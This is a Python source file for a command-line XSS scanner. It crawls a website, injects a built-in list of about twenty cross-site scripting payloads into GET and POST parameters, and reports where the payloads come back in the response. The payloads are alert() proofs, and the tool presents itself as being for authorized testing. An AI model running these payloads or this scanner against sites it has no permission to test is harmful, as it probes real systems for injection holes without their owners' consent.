import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import re
import argparse
import time

BANNER = """
██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
╚██╗██╔╝╚══███╔╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
 ╚███╔╝   ███╔╝ ███████╗    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
 ██╔██╗  ███╔╝  ╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██╔╝ ██╗███████╗███████║    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
"""

print(BANNER)
print("XSS Scanner Tool - For educational and authorized testing only")
print("="*80)
print("DISCLAIMER: Only use on websites you own or have permission to test.\n")
print("Unauthorized testing may violate laws and website terms of service.\n")

class XSSScanner:
    def __init__(self):
        self.vulnerable_urls = []
        self.tested_urls = []
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '\'"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(`XSS`)">',
            '<a href="javascript:alert(\'XSS\')">Click</a>',
            '<div onmouseover="alert(\'XSS\')">Hover</div>',
            '<input type="text" value="<script>alert(\'XSS\')</script>">',
            '<details open ontoggle=alert("XSS")>',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src=x onerror=alert("XSS")>',
            '<form action="javascript:alert(\'XSS\')"><input type=submit>',
            '<math><maction actiontype="statusline#http://example.com" href="javascript:alert(\'XSS\')">Click</maction></math>',
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            '%27%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
            '"><iframe src="data:text/html,&lt;script&gt;alert(\'XSS\')&lt;/script&gt;">',
            '"><svg/onload=alert("XSS")>'
        ]
        self.reflected_xss_patterns = [
            r'<script>alert\("XSS"\)</script>',
            r'<img src=x onerror=alert\("XSS"\)>',
            r'<svg onload=alert\("XSS"\)>',
            r'javascript:alert\("XSS"\)',
            r'onload=alert\("XSS"\)',
            r'onerror=alert\("XSS"\)',
            r'onmouseover=alert\("XSS"\)',
            r'ontoggle=alert\("XSS"\)'
        ]
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        self.timeout = 10

    def scan_url(self, url, params=None, cookies=None):
        """Scan a single URL for XSS vulnerabilities"""
        print(f"\n[*] Testing URL: {url}")
        
        # Test GET parameters
        if '?' in url:
            base_url, query = url.split('?', 1)
            param_dict = {}
            for pair in query.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    param_dict[key] = value
            
            for param in param_dict:
                original_value = param_dict[param]
                for payload in self.payloads:
                    param_dict[param] = payload
                    new_query = '&'.join([f"{k}={v}" for k, v in param_dict.items()])
                    test_url = f"{base_url}?{new_query}"
                    self._test_xss(test_url, param, payload, cookies)
                param_dict[param] = original_value
        
        # Test POST parameters if provided
        if params:
            for param in params:
                original_value = params[param]
                for payload in self.payloads:
                    params[param] = payload
                    self._test_xss(url, param, payload, cookies, data=params)
                params[param] = original_value
        
        # If no parameters, just test the URL as is
        if '?' not in url and not params:
            for payload in self.payloads:
                test_url = url + payload
                self._test_xss(test_url, "URL", payload, cookies)

    def _test_xss(self, url, param, payload, cookies=None, data=None):
        """Test a specific URL with an XSS payload"""
        if url in self.tested_urls:
            return
        self.tested_urls.append(url)
        
        try:
            headers = {'User-Agent': self.user_agent}
            
            if data:
                response = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=self.timeout)
            else:
                response = requests.get(url, headers=headers, cookies=cookies, timeout=self.timeout)
            
            content = response.text
            
            # Check if payload is reflected in response
            if payload in content:
                print(f"[!] Potential reflected XSS in {param} with payload: {payload[:50]}...")
                self.vulnerable_urls.append((url, param, payload, "Reflected"))
            
            # Check for common XSS patterns that might be filtered
            for pattern in self.reflected_xss_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    print(f"[!] Potential filtered XSS in {param} with pattern: {pattern}")
                    self.vulnerable_urls.append((url, param, payload, f"Filtered pattern: {pattern}"))
                    break
            
            # Check for DOM-based XSS clues
            if "eval(" in content or "innerHTML" in content or "document.write" in content:
                print(f"[?] Potential DOM XSS source in {param} - JavaScript sinks detected")
                self.vulnerable_urls.append((url, param, payload, "DOM XSS source detected"))
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing {url}: {str(e)}")
        except Exception as e:
            print(f"[-] Unexpected error: {str(e)}")

    def crawl_and_test(self, base_url, max_pages=10):
        """Crawl a website and test all found URLs"""
        print(f"\n[*] Starting crawl of {base_url} (max {max_pages} pages)")
        
        visited = set()
        to_visit = set([base_url])
        domain = urlparse(base_url).netloc
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop()
            
            if url in visited:
                continue
                
            visited.add(url)
            print(f"[*] Crawling: {url}")
            
            try:
                response = requests.get(url, headers={'User-Agent': self.user_agent}, timeout=self.timeout)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Test this page
                self.scan_url(url)
                
                # Find all links on the page
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urljoin(url, href)
                    
                    # Only follow links within the same domain
                    if urlparse(absolute_url).netloc == domain:
                        to_visit.add(absolute_url)
                        
                # Find all forms on the page
                for form in soup.find_all('form'):
                    form_action = form.get('action', '')
                    if form_action:
                        form_url = urljoin(url, form_action)
                        form_method = form.get('method', 'get').lower()
                        form_inputs = {}
                        
                        for input_tag in form.find_all('input'):
                            name = input_tag.get('name')
                            if name:
                                form_inputs[name] = input_tag.get('value', '')
                        
                        if form_method == 'post':
                            self.scan_url(form_url, params=form_inputs)
                        
            except requests.exceptions.RequestException as e:
                print(f"[-] Error crawling {url}: {str(e)}")
            
            time.sleep(1)  # Be polite

def main():
    parser = argparse.ArgumentParser(description='XSS Scanner Tool')
    parser.add_argument('url', help='URL to test')
    parser.add_argument('-c', '--crawl', action='store_true', help='Crawl the website and test all pages')
    parser.add_argument('-p', '--params', help='POST parameters to test (format: param1=val1,param2=val2)')
    parser.add_argument('-C', '--cookies', help='Cookies to send (format: name1=val1;name2=val2)')
    
    args = parser.parse_args()
    
    scanner = XSSScanner()
    
    # Parse cookies if provided
    cookies = {}
    if args.cookies:
        for pair in args.cookies.split(';'):
            if '=' in pair:
                name, value = pair.split('=', 1)
                cookies[name.strip()] = value.strip()
    
    # Parse POST parameters if provided
    post_params = {}
    if args.params:
        for pair in args.params.split(','):
            if '=' in pair:
                name, value = pair.split('=', 1)
                post_params[name.strip()] = value.strip()
    
    if args.crawl:
        scanner.crawl_and_test(args.url)
    else:
        if post_params:
            scanner.scan_url(args.url, params=post_params, cookies=cookies)
        else:
            scanner.scan_url(args.url, cookies=cookies)
    
    # Print summary
    print("\n[+] Scan Complete")
    print("="*50)
    print(f"Total URLs tested: {len(scanner.tested_urls)}")
    print(f"Potential vulnerabilities found: {len(scanner.vulnerable_urls)}\n")
    
    if scanner.vulnerable_urls:
        print("[!] Potential XSS Vulnerabilities:")
        for url, param, payload, reason in scanner.vulnerable_urls:
            print(f"\nURL: {url}")
            print(f"Parameter: {param}")
            print(f"Payload: {payload[:100]}...")
            print(f"Type: {reason}")
            print("-"*50)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] An error occurred: {str(e)}")